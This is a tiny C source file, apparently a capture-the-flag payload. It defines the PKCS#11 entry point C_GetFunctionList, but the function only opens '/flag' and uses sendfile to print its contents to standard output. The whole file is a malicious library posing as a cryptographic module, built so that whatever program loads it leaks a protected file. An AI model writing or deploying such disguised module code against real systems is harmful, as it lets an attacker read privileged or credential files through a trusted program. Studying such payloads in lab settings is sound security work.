#include <sys/sendfile.h>
#include <fcntl.h>

int C_GetFunctionList(){
    int fd = open("/flag", O_RDONLY);
    sendfile(1, fd, 0, 70);
    return 0;
}